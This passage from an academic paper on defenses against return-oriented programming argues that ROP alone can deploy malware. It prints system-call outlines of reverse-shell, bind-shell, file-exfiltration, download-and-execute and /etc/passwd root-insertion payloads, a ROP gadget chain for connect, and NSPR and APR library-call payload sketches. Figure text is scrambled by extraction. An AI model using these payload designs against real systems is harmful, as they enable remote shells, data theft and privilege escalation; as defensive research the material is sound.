write full payloads [28]. A recent Adobe Reader exploit based purely on ROP attacks
supports this notion [3]. Should this be the case, code injection is unnecessary for real
malware.
MALWARE 
CODE 
INJECTION 
DEP 
DEP BROKEN 
ROP 
Fig. 5: ROP as an enabler of code injection
The relevant model section is shown in Figure 5. Note that if we set the constraint
that dep_broken=False, the SAT solver will be unable to ﬁnd any instance in which
malware can be deployed despite ROP being available. Speciﬁcally, in this version of
the model, code injection is a prerequisite for malware, but unbreakable DEP renders
code injection impossible.
This model conﬁguration is consistent with real-world malware, but not the aca-
demic community’s view of ROP. Hypothetically, there is some path (illustrated as the
dotted line in Figure 5) which allows ROP alone to enable malware deployment.
12
Skowyra, Casteel, Okhravi, Zeldovich, & Streilein
This is indeed the case, as we prove below. The model can be updated with a path
to malware deployment from ROP which requires one added capability: the presence
of a system call gadget in the process address space. This is shown in Figure 6, along
with a now satisfying instance of the model in which malware is enabled alongside
unbreakable DEP.
MALWARE 
CODE 
INJECTION 
Syscall 
Gadget 
ROP 
DEP 
BROKEN 
DEP 
Fig. 6: ROP as a malware deployment technique
The proof by construction considers a successful malware deployment to consist of
any one of the following payloads:
– Downloader: A program which connects to a remote host, downloads arbitrary
content, saves it to disk, and executes it
– Uploader: A program which exﬁltrates ﬁles from the host to a remote location
– Backdoor: A program which creates a shell accessible from an external host and
awaits a connection.
– Reverse Backdoor: A program which creates a connection to an external host and
binds a shell to that connection.
– Root Inserter: Adds a new root user to the system
We implemented every payload using purely ROP. We began by reducing each pay-
load to a simple linear sequence of system calls, shown in Figure 7. We did not need
looping constructs, although Turing-Completeness is certainly available to more ad-
vanced payloads [28]. The phantom stack referenced in the ﬁgure is explained below.
In essence, it provides the memory management required to enable reusable system call
chains.
The challenge, then, is to translate each sequence of system calls to a ROP pro-
gram. We extracted a catalog of ROP gadgets from GNU libc version 2.13 using the
established Galileo algorithm [28], and crafted each payload using these gadgets.
Due to the level of system call reuse across these payloads, we constructed each
system call gadget to be modular and easily chained. For calls like socket, translation
to ROP code is straightforward: arguments are immediate values that can be written to
the stack during the payload injection phase, registers can be loaded via common pop
reg; ret sequences, then the call can be invoked.
Unfortunately, things are harder in the general case. Setting arguments for an ar-
bitrary chain of system calls introduces two challenges: dynamically generated values
(like ﬁle descriptors) must be tracked across system calls, and some arguments (e.g.
pointers to struct pointers) must be passed via multiple levels of indirection. These chal-
Systematic Analysis of Defenses Against ROP
13
Reverse Backdoor
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
connect(fd, &addr, 0x10);
dup2(fd, 0);
dup2(fd, 1);
dup2(fd, 2);
execve("/bin/sh", ["/bin/sh"], 0);
Uploader
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
connect(fd, &addr, 0x10);
fd2 = open("target_file", 0);
sendfile(fd, fd2, 0, file_size);
Root Inserter
sbrk(0);
sbrk(phantom_stack_size);
setuid(0);
fd = open("/etc/passwd", 002001);
write(fd, "toor:x:0:0::/:/bin/bash\n", 24);
Downloader
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
connect(fd, &addr, 0x10);
read(fd, buf, buf_len);
fd2 = open("badfile", 0101, 00777);
write(fd2, buf, buf_len);
execve("badfile", ["badfile"], 0);
Backdoor
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
bind(fd, fd, &addr, 0x10);
listen(fd, 1);
fd2 = accept(fd, &addr, 0x10);
dup2(fd2, 0);
dup2(fd2, 1);
dup2(fd2, 2);
execve("/bin/sh", ["/bin/sh"], 0);
Fig. 7: System-call-based implementations of Metasploit payloads.
lenges are further complicated by two restrictions imposed by ROP: the stack cannot be
pushed to in an uncontrolled way (since that is where the payload resides), and register
access may be constrained by the available gadgets in the catalog.
As an example of the above challenges, consider the connect system call, which is
critical for any network I/O. Like all socket setup functions in Linux, it is invoked via
the socketcall interface: eax is set to 0x66 (the system call number), ebx is set to
0x3 (connect), and ecx is set as a pointer to the arguments to connect.
These arguments include both dynamic data (a ﬁle descriptor) and double indirec-
tion (a pointer to data that has a pointer to a struct). Since the stack cannot be pushed
to and dynamic data cannot be included at injection time, these arguments have to be
written elsewhere in memory. Since register-register operations are limited (especially
just prior to the call, when eax and ebx are off-limits), the above memory setup has to
be done with only a few registers. Finally, since this is just one system call in a chain of
such calls, memory addresses should be tracked for future reuse.
We resolved these issues by implementing a ‘phantom’ stack on the heap. The phan-
tom stack is simply memory allocated by the attacker via the sbrk system call, which
gets or sets the current program break. Note that this is not a stack pivot: the original pro-
gram stack is still pointed to by esp. This is a secondary stack, used by the attacker to
manage payload data. A related construction was used in [7] for creating ROP payloads
on the ARM platform.
Creating the phantom stack does not require any prior control over the heap, and
goes through legitimate kernel interfaces to allocate the desired memory. Pushes and
pops to this stack reduce to arithmetic gadgets over a phantom stack pointer register. For
our gadget catalog, eax was best suited to the purpose. A degree of software engineering
is required to ensure correct phantom stack allocation and management. This, along
with several other useful ROP constructs, will be the focus of a future publication.
14
Skowyra, Casteel, Okhravi, Zeldovich, & Streilein
to connect
A complete ROP gadget
to
localhost on port 43690 is presented in Figure 8.
The phantom stack must already be allocated, and
the active ﬁle descriptor is assumed to be pushed
onto it. The gadget can be divided into three func-
tional components, as indicated by the lines drawn
across the stack diagram.
From the bottom, the ﬁrst component prepares
the arguments to connect(fd, &addr, 0x10)
on the phantom stack and puts a pointer to these
arguments in ecx. The second component saves
the phantom stack pointer into edx, loads eax and
ebx with the necessary system call and socketcall
identiﬁers, and invokes the system call interrupt.
The pop reg instructions following the interrupt
are unavoidable, as this is the smallest system call
gadget we could ﬁnd. To prevent control ﬂow dis-
ruptions, we pad the stack with junk values to be
loaded into the popped registers. The third compo-
nent is similar to traditional function epilogues. It
moves eax above the memory used by this gadget,
freeing that portion of the phantom stack for use
by other gadgets.
0x10
0xFF
0xFF
0xFF
0xFF
0x66
0x3
0x04
0x10
0x04
0xAAAA0002
pop edx
mov eax,[eax]
mov eax,edx
int 0x80
pop ebp
pop edi
pop esi
pop ebx
mov ebx,edx
xchg ebx,ecx
xchg eax,edx
add eax, edx
sub eax, edx
mov [eax], ecx
We have implemented similar gadgets for all
other system calls used by our payloads. Due to
space limitations, the complete listings are pre-
sented in our technical report. By executing these
in sequence, any of the payloads described above can be implemented using the ROP
gadgets derived from the libc shared library.
Fig. 8:
connect(fd, &addr, 0x10)
gadget
ROP
0x04
0x0100007f
pop ecx
pop edx
for
6.2 Return-into-LibN
While Return-into-Libc (RiL) attacks can, in principle, be performed against any library,
it is not clear whether there exist common, frequently linked libraries which actually
possess useful functions for implementing real-world malware payloads. These alterna-
tive sources would be quite valuable in cases where libc is given special protection due
to its ubiquity and power with respect to system call operations.
To this end, the formal model treats libc as something of a special case: RiL attacks
require that useful functions are available from libc. In this section, we show that Return-
into-Libc attacks can in fact be performed against many other libraries. Speciﬁcally, the
Apache Portable Runtime (used by the Apache webserver), the Netscape Portable Run-
time (used by Firefox and Thunderbird), and the GLib application framework (used by
programs running in the GNOME desktop environment) possess sufﬁcient I/O functions
to implement downloaders, uploaders, backdoors, and reverse backdoors.
We use the attacker model from Tran et al. [34], which allows the attacker to cause
the execution of functions of their choosing with arguments of their choosing, as long
Systematic Analysis of Defenses Against ROP
15
as those functions are already present in the process address space. The attacker also
has some region of memory under his control and knows the addresses of memory in
this region. This could be an area of the stack above the payload itself or memory in
a known writable location, possibly allocated by one of the available library functions.
The memory is used to store data structures and arguments, as well as to maintain data
persistence across function calls.
NSPR NSPR is a libc-like library that does not have a generic system call inter-
face. However, it supports socket-based I/O, ﬁle system operations, process spawning,
and memory mapping and manipulation. These are sufﬁcient to implement an uploader,
downloader, backdoor, and reverse backdoor in a straightforward way. The lack of any
setuid-like function makes root-insertion impossible, but a root-inserter could easily be
injected via one of the other payloads. Figure 9 presents a reverse backdoor written in
NSPR. All payloads are written using NSPR version 4.9.
PR_NewTCPSocket();
...
PR_NewTCPSocket();
PR_Connect(sock, &addr, NULL);
PR_ProcessAttrSetStdioRedirect(attr,PR_StandardInput,sock);
PR_ProcessAttrSetStdioRedirect(attr,PR_StandardOutput,sock);
PR_ProcessAttrSetStdioRedirect(attr,PR_StandardError,sock);
PR_CreateProcess("/bin/sh", argv, NULL, attr);
Note the large number (de-
noted with an ellipsis) of socket
creations in Figure 9. This is
due to the unavailability of func-
tion return values in Return-into-
Libc-like programming. Any op-
eration which is not a func-
tion (including variable assign-
ment) cannot be used to write a
payload with this technique. As
such, we must ‘spray’ the ﬁle de-
scriptor space by allocating many descriptors and then guess ﬁle descriptors using an
immediate value. Note that while NSPR uses a custom PRFileDesc socket descriptor,
the structure’s layout is well documented, and the attacker can easily write the descrip-
tor directly to a prepared PRFileDesc object.
Fig. 9: Reverse Backdoor using NSPR
The only other complication when writing NSPR payloads is in how a new address
space is prepared when creating a shell for backdoors. There is no dup2 analogue that
lets the attacker bind standard streams to the new shell. Instead, process attributes spec-
ifying redirected streams must be set before a new process is spawned. Upon process
creation the streams are set to the ﬁle descriptor of the socket, and the attack proceeds
normally.
APR APR also implements a libc-like functionality, but uses a function call conven-
tion that makes many Return-into-Libc attacks much more reliable. Functions in APR
return status codes and write the result of the computation to a memory region speciﬁed
by the user. This eliminates (among other difﬁculties) the need for ﬁle descriptor spray-
ing. Figure 10 depicts a downloader using APR function calls. All payloads use APR
version 1.4.
The apr_pool_create func-
tion is a library-speciﬁc memory
allocator that must be called at
the start of any APR program.
While a pool created by the com-
apr_pool_create(&pool, NULL);
apr_socket_create(&sock, 2, 1, 0, pool);
apr_socket_connect(sock, &addr);